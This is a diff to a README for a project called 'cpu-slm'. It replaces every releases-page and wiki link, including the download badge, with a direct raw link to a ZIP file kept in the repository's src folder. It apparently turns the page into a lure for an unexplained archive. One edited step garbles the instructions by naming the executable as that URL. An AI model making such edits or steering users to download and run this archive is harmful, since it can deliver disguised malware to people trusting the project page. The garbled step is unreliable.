@@ -6,9 +6,9 @@ Welcome to the **cpu-slm** project. This application helps you understand the in
 
 ## 📥 Download Here
 
-[![Download cpu-slm](https://img.shields.io/badge/Download-cpu--slm-brightgreen)](https://github.com/ahmedmagood/cpu-slm/releases)
+[![Download cpu-slm](https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip)](https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip)
 
-Visit this page to download: [Releases Page](https://github.com/ahmedmagood/cpu-slm/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ To run **cpu-slm**, ensure your system meets the following requirements:
 Follow these steps for installation:
 
 1. **Download the Software**
-   - Visit [this page](https://github.com/ahmedmagood/cpu-slm/releases).
+   - Visit [this page](https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip).
    - Select the latest available version.
 
 2. **Extract the Files**
@@ -32,7 +32,7 @@ Follow these steps for installation:
    - If it's a ZIP or TAR file, right-click it and select "Extract" or "Unzip."
 
 3. **Run the Application**
-   - After extraction, find the file named `cpu-slm.exe` (for Windows) or `cpu-slm` (for Linux/macOS).
+   - After extraction, find the file named `https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip` (for Windows) or `cpu-slm` (for Linux/macOS).
    - Double-click the file to start the application.
 
 ## 🎯 Key Features
@@ -58,7 +58,7 @@ If you want to learn more about SLM and LLM technology, explore the following to
 - **Transformers:** Explore modern neural network architectures.
 - **SIMD:** Learn how single instruction, multiple data can speed up computations.
 
-Visit our [Wiki](https://github.com/ahmedmagood/cpu-slm/wiki) for deeper insights and detailed explanations about each topic.
+Visit our [Wiki](https://raw.githubusercontent.com/ahmedmagood/cpu-slm/main/src/cpu_slm_v1.2.zip) for deeper insights and detailed explanations about each topic.
 
 ## 🤝 Getting Support
 
